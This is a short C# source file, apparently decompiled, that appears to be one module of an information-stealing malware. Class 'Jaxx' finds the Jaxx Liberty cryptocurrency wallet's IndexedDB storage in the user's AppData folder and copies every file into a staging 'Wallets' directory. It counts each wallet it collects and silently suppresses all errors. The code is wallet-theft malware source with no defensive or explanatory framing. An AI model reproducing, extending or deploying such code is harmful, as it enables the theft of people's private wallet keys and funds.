using System.IO;

namespace exos;

internal class Jaxx
{
	public static int count = 0;

	public static string JaxxDir = "\\Wallets\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\";

	public static void JaxxStr(string directorypath)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Helper.AppData + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(directorypath + JaxxDir);
				fileInfo.CopyTo(directorypath + JaxxDir + fileInfo.Name);
			}
			count++;
			Counting.Wallets++;
		}
		catch
		{
		}
	}
}
